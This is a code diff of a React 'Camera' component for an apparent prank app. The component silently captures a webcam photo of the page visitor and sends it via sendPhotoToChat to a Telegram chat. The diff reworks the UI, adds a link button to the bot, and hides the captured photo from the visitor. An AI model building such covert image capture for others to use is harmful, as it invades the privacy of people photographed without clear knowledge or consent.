@@ -1,6 +1,7 @@
 "use client";
 
 import confetti from "canvas-confetti";
+import { ArrowUpRight } from "lucide-react";
 import { useTranslations } from "next-intl";
 import { useCallback, useEffect, useState } from "react";
 import { sendPhotoToChat } from "../_actions/send-photo-to-chat";
@@ -52,6 +53,31 @@ interface CameraProps {
 	chatId: number;
 }
 
+type DescriptionTextTranslationKeys = Extract<keyof IntlMessages["prank"], "subtitle" | "description">;
+
+const DescriptionText = ({ translationKey }: { translationKey: DescriptionTextTranslationKeys }) => {
+	const t = useTranslations("prank");
+
+	return (
+		<p className="text-lg">
+			{t.rich(translationKey, {
+				botTag: `@${process.env.NEXT_PUBLIC_BOT_NAME}`,
+				a: (content) => (
+					<a
+						className="hover:text-orange-500 transition duration-200"
+						href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
+						target="_blank"
+						rel="noreferrer"
+					>
+						{content}
+					</a>
+				),
+				u: (content) => <span className="underline underline-offset-4">{content}</span>
+			})}
+		</p>
+	);
+};
+
 export const Camera = ({ chatId }: CameraProps) => {
 	const { videoRef, canvasRef, photo } = useCamera();
 	const [isTakingPhoto, setIsTakingPhoto] = useState(true);
@@ -83,29 +109,30 @@ export const Camera = ({ chatId }: CameraProps) => {
 	}, [photo, handlePhoto]);
 
 	return (
-		<div className="flex flex-col justify-center items-center gap-12">
-			{isTakingPhoto ? <Loader /> : <h1 className="text-3xl font-bold">{t("title")}</h1>}
+		<>
 			<video ref={videoRef} style={{ display: "none" }} autoPlay />
-			<canvas className={isTakingPhoto ? "hidden" : "visible rounded-xl max-h-[50vh]"} ref={canvasRef} />
-			{!isTakingPhoto && (
-				<p className="text-center text-lg">
-					{t.rich("subtitle", {
-						botTag: `@${process.env.NEXT_PUBLIC_BOT_NAME}`,
-						a: (content) => (
-							<a
-								className="hover:text-orange-500"
-								href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
-								target="_blank"
-								rel="noreferrer"
-							>
-								{content}
-							</a>
-						),
-						u: (content) => <span className="underline underline-offset-4">{content}</span>
-					})}
-				</p>
+			<canvas className="hidden" ref={canvasRef} />
+			{!isTakingPhoto ? (
+				<div className="flex flex-col justify-center items-center gap-8 w-full md:w-1/2 bg-neutral-900 px-6 py-12 md:p-12 rounded-2xl">
+					<h1 className="text-3xl font-bold">{t("title")}</h1>
+					<div className="space-y-4">
+						<DescriptionText translationKey="subtitle" />
+						<DescriptionText translationKey="description" />
+					</div>
+					<a
+						className="relative px-6 py-3 rounded-lg text-center bg-neutral-600 hover:bg-neutral-500 transition duration-200 text-white"
+						href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
+						rel="noreferrer noopener"
+						target="_blank"
+					>
+						{t("button")}
+						<ArrowUpRight className="absolute top-0.5 right-0.5 size-4" />
+					</a>
+				</div>
+			) : (
+				<Loader />
 			)}
-		</div>
+		</>
 	);
 };
 
